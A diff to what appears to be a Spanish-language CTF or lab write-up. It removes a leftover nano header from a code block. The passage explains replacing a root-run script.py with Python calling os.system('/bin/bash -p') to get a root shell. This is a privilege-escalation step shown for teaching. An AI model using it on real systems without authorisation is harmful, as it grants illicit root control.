@@ -158,8 +158,7 @@ drwxr-xr-x 1 root   root 4096 May 26 10:04 ../
 -r-xr--r-- 1 carlos root  272 May  7 15:19 script.py
 ```
 Como tenemos permisos de ese fichero podemos elimiar este fichero llamado **script.py** y crear otro para que nos lance una bash cuando lo ejecutemos, así como lo ejecutamos como **root**, ya tenemos control total.
-```python
-  GNU nano 7.2                                                                                                     script.py *                                                                                                             
+```python        
 import os
 
 os.system('/bin/bash -p')
